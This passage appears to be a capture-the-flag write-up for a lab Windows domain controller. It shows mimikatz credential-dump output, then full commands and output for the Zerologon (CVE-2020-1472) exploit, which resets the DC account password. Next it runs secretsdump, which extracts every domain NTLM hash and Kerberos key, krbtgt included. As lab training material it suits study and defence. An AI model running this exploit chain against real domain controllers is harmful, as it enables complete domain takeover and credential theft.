         * Password : K3epEmH4cK3rzoUttaH3re!
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 9/27/2020 2:21:55 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

mimikatz(commandline) # exit
Bye!
```

## Own DC with CVE 2020-1472
### 1. Setup
```bash
kali@kali:/tmp/temp$ git clone https://github.com/SecureAuthCorp/impacket.git
Cloning into 'impacket'...
remote: Enumerating objects: 49, done.
remote: Counting objects: 100% (49/49), done.
remote: Compressing objects: 100% (35/35), done.
remote: Total 18574 (delta 26), reused 31 (delta 14), pack-reused 18525
Receiving objects: 100% (18574/18574), 6.18 MiB | 2.63 MiB/s, done.
Resolving deltas: 100% (14142/14142), done.
kali@kali:/tmp/temp$ cd impacket/
kali@kali:/tmp/temp/impacket$ python3 -m venv venv
kali@kali:/tmp/temp/impacket$ source venv/bin/activate

(venv) kali@kali:/tmp/temp/impacket$ pip3 install wheel
Collecting wheel
  Downloading wheel-0.35.1-py2.py3-none-any.whl (33 kB)
Installing collected packages: wheel
Successfully installed wheel-0.35.1
(venv) kali@kali:/tmp/temp/impacket$ pip install .
Processing /tmp/temp/impacket
Requirement already satisfied: flask>=1.0 in ./venv/lib/python3.8/site-packages (from impacket==0.9.22.dev1+20200924.183326.65cf657f) (1.1.2)
Requirement already satisfied: ldap3!=2.5.0,!=2.5.2,!=2.6,>=2.5 in ./venv/lib/python3.8/site-packages (from impacket==0.9.22.dev1+20200924.183326.65cf657f) (2.8.1)
Requirement already satisfied: ldapdomaindump>=0.9.0 in ./venv/lib/python3.8/site-packages (from impacket==0.9.22.dev1+20200924.183326.65cf657f) (0.9.3)
Requirement already satisfied: pyOpenSSL>=0.13.1 in ./venv/lib/python3.8/site-packages (from impacket==0.9.22.dev1+20200924.183326.65cf657f) (19.1.0)
Requirement already satisfied: pyasn1>=0.2.3 in ./venv/lib/python3.8/site-packages (from impacket==0.9.22.dev1+20200924.183326.65cf657f) (0.4.8)
Requirement already satisfied: pycryptodomex in ./venv/lib/python3.8/site-packages (from impacket==0.9.22.dev1+20200924.183326.65cf657f) (3.9.8)
Requirement already satisfied: six in ./venv/lib/python3.8/site-packages (from impacket==0.9.22.dev1+20200924.183326.65cf657f) (1.15.0)
Requirement already satisfied: Jinja2>=2.10.1 in ./venv/lib/python3.8/site-packages (from flask>=1.0->impacket==0.9.22.dev1+20200924.183326.65cf657f) (2.11.2)
Requirement already satisfied: click>=5.1 in ./venv/lib/python3.8/site-packages (from flask>=1.0->impacket==0.9.22.dev1+20200924.183326.65cf657f) (7.1.2)
Requirement already satisfied: itsdangerous>=0.24 in ./venv/lib/python3.8/site-packages (from flask>=1.0->impacket==0.9.22.dev1+20200924.183326.65cf657f) (1.1.0)
Requirement already satisfied: Werkzeug>=0.15 in ./venv/lib/python3.8/site-packages (from flask>=1.0->impacket==0.9.22.dev1+20200924.183326.65cf657f) (1.0.1)
Requirement already satisfied: dnspython in ./venv/lib/python3.8/site-packages (from ldapdomaindump>=0.9.0->impacket==0.9.22.dev1+20200924.183326.65cf657f) (2.0.0)
Requirement already satisfied: future in ./venv/lib/python3.8/site-packages (from ldapdomaindump>=0.9.0->impacket==0.9.22.dev1+20200924.183326.65cf657f) (0.18.2)
Requirement already satisfied: cryptography>=2.8 in ./venv/lib/python3.8/site-packages (from pyOpenSSL>=0.13.1->impacket==0.9.22.dev1+20200924.183326.65cf657f) (3.1.1)
Requirement already satisfied: MarkupSafe>=0.23 in ./venv/lib/python3.8/site-packages (from Jinja2>=2.10.1->flask>=1.0->impacket==0.9.22.dev1+20200924.183326.65cf657f) (1.1.1)
Requirement already satisfied: cffi!=1.11.3,>=1.8 in ./venv/lib/python3.8/site-packages (from cryptography>=2.8->pyOpenSSL>=0.13.1->impacket==0.9.22.dev1+20200924.183326.65cf657f) (1.14.3)
Requirement already satisfied: pycparser in ./venv/lib/python3.8/site-packages (from cffi!=1.11.3,>=1.8->cryptography>=2.8->pyOpenSSL>=0.13.1->impacket==0.9.22.dev1+20200924.183326.65cf657f) (2.20)
Building wheels for collected packages: impacket
  Building wheel for impacket (setup.py) ... done
  Created wheel for impacket: filename=impacket-0.9.22.dev1+20200924.183326.65cf657f-py3-none-any.whl size=1380821 sha256=6e807338fec609142ad2a4bb29a48a7c05d18cca3a4da951413d9a74952dc8b4
  Stored in directory: /tmp/pip-ephem-wheel-cache-oejtjf_8/wheels/67/aa/a0/15c3e2dc4449350f9b1428fe452b7dec364e381d8438021f1a
Successfully built impacket
Installing collected packages: impacket
  Attempting uninstall: impacket
    Found existing installation: impacket 0.9.22.dev1+20200924.183326.65cf657f
    Uninstalling impacket-0.9.22.dev1+20200924.183326.65cf657f:
      Successfully uninstalled impacket-0.9.22.dev1+20200924.183326.65cf657f
Successfully installed impacket-0.9.22.dev1+20200924.183326.65cf657f
(venv) kali@kali:/tmp/temp/impacket$ cd ..
(venv) kali@kali:/tmp/temp$ git clone https://github.com/dirkjanm/CVE-2020-1472
Cloning into 'CVE-2020-1472'...
remote: Enumerating objects: 41, done.
remote: Counting objects: 100% (41/41), done.
remote: Compressing objects: 100% (32/32), done.
remote: Total 41 (delta 14), reused 34 (delta 9), pack-reused 0
Unpacking objects: 100% (41/41), 23.75 KiB | 694.00 KiB/s, done.
```

### 2. Exploiting
```bash
(venv) kali@kali:/tmp/temp$ cd CVE-2020-1472/
(venv) kali@kali:/tmp/temp/CVE-2020-1472$ python3 cve-2020-1472-exploit.py FUSE 10.10.10.193
Performing authentication attempts...
===================================================================================================================================================================================
Target vulnerable, changing account password to empty string

Result: 0

Exploit complete!
(venv) kali@kali:/tmp/temp/CVE-2020-1472$ secretsdump.py -just-dc -no-pass FUSE\$@10.10.10.193
Impacket v0.9.22.dev1+20200924.183326.65cf657f - Copyright 2020 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:370ddcf45959b2293427baa70376e14e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8ee7fac1bd38751dbff06b33616b87b0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
svc-print:1104:aad3b435b51404eeaad3b435b51404ee:38485fd7730cca53473d0fa6ed27aa71:::
bnielson:1105:aad3b435b51404eeaad3b435b51404ee:8873f0c964ab36700983049e2edd0f77:::
sthompson:1601:aad3b435b51404eeaad3b435b51404ee:5fb3cc8b2f45791e200d740725fdf8fd:::
tlavel:1602:aad3b435b51404eeaad3b435b51404ee:8873f0c964ab36700983049e2edd0f77:::
pmerton:1603:aad3b435b51404eeaad3b435b51404ee:e76e0270c2018153275aab1e143421b2:::
svc-scan:1605:aad3b435b51404eeaad3b435b51404ee:38485fd7730cca53473d0fa6ed27aa71:::
bhult:7101:aad3b435b51404eeaad3b435b51404ee:8873f0c964ab36700983049e2edd0f77:::
dandrews:7102:aad3b435b51404eeaad3b435b51404ee:689583f00ad18c124c58405479b4c536:::
mberbatov:7601:aad3b435b51404eeaad3b435b51404ee:b2bdbe60565b677dfb133866722317fd:::
astein:7602:aad3b435b51404eeaad3b435b51404ee:2f74c867a93cda5a255b1d8422192d80:::
dmuir:7603:aad3b435b51404eeaad3b435b51404ee:6320f0682f940651742a221d8218d161:::
FUSE$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:e6dcafd3738f9433358d59ef8015386a8c0a418a09b3e8968f8a00c6fa077984
Administrator:aes128-cts-hmac-sha1-96:83c4a7c2b6310e0b2323d7c67c9a8d68
Administrator:des-cbc-md5:0dfe83ce576d8aae
krbtgt:aes256-cts-hmac-sha1-96:5a844c905bc3ea680729e0044a00a817bb8e6b8a89c01b0d2f949e2d7ac9952e
krbtgt:aes128-cts-hmac-sha1-96:67f0c1ace3b5a9f43e90a00c1e5445c6
krbtgt:des-cbc-md5:49d93d43321f02b3
svc-print:aes256-cts-hmac-sha1-96:f06c128c73c7a4a2a6817ee22ce59979eac9789adf7043acbf11721f3b07b754
svc-print:aes128-cts-hmac-sha1-96:b662d12fedf3017aed71b2bf96ac6a99
svc-print:des-cbc-md5:fea11fdf6bd3105b
bnielson:aes256-cts-hmac-sha1-96:62aef12b7b5d68fe508b5904d2966a27f98ad83b5ca1fb9930bbcf420c2a16b6
bnielson:aes128-cts-hmac-sha1-96:70140834e3319d7511afa5c5b9ca4b32
bnielson:des-cbc-md5:9826c42010254a76
sthompson:aes256-cts-hmac-sha1-96:e93eb7d969f30a4acb55cff296599cc31f160cca523a63d3b0f9eba2787e63a5
sthompson:aes128-cts-hmac-sha1-96:a8f79b1eb4209a0b388d1bb99b94b0d9
sthompson:des-cbc-md5:4f9291c46291ba02
tlavel:aes256-cts-hmac-sha1-96:f415075d6b6566912c97a4e9a0249b2b209241c341534cb849b657711de11525
tlavel:aes128-cts-hmac-sha1-96:9ac52b65b9013838f129bc9a99826a4f
tlavel:des-cbc-md5:2a238576ab7a6213
pmerton:aes256-cts-hmac-sha1-96:102465f59909683f260981b1d93fa7d0f45778de11b636002082575456170db7
pmerton:aes128-cts-hmac-sha1-96:4dc80267b0b2ecc02e437aef76714710
pmerton:des-cbc-md5:ef3794940d6d0120
svc-scan:aes256-cts-hmac-sha1-96:053a97a7a728359be7aa5f83d3e81e81637ec74810841cc17acd1afc29850e5c
svc-scan:aes128-cts-hmac-sha1-96:1ae5f4fecd5b3bd67254d21f6adb6d56
svc-scan:des-cbc-md5:e30b208ccecd57ad
bhult:aes256-cts-hmac-sha1-96:f1097eb00e508bf95f4756a28f18f490c40ed3274b2fd67da8919647591e2c74
bhult:aes128-cts-hmac-sha1-96:b1f2affb4c9d4c70b301923cc5d89336
bhult:des-cbc-md5:4a1a209d4532a7b9
dandrews:aes256-cts-hmac-sha1-96:d2c7389d3185d2e68e47d227d817556349967cac1d5bfacb780aaddffeb34dce
dandrews:aes128-cts-hmac-sha1-96:497bd974ccfd3979edb0850dc65fa0a8
dandrews:des-cbc-md5:9ec2b53eae6b20f2
mberbatov:aes256-cts-hmac-sha1-96:11abccced1c06bfae96b0309c533812976b5b547d2090f1eaa590938afd1bc4a
mberbatov:aes128-cts-hmac-sha1-96:fc50f72a3f79c2abc43d820f849034da
mberbatov:des-cbc-md5:8023a16b9b3d5186
astein:aes256-cts-hmac-sha1-96:7f43bea8fd662b275434644b505505de055cdfa39aeb0e3794fec26afd077735
astein:aes128-cts-hmac-sha1-96:0d27194d0733cf16b5a19281de40ad8b
astein:des-cbc-md5:254f802902f8ec7a
dmuir:aes256-cts-hmac-sha1-96:67ffc8759725310ba34797753b516f57e0d3000dab644326aea69f1a9e8fedf0
dmuir:aes128-cts-hmac-sha1-96:692fde98f45bf520d494f50f213c6762
dmuir:des-cbc-md5:7fb515d59846498a
FUSE$:aes256-cts-hmac-sha1-96:ba250f2101ecad1a2aa8fab0c95d7a66b59c904eb0edd47121f51ff561f3fb2e
FUSE$:aes128-cts-hmac-sha1-96:bf995eed47e2a8849b72e95eabd5a929
FUSE$:des-cbc-md5:b085ab974ff1e049
[*] Cleaning up...
```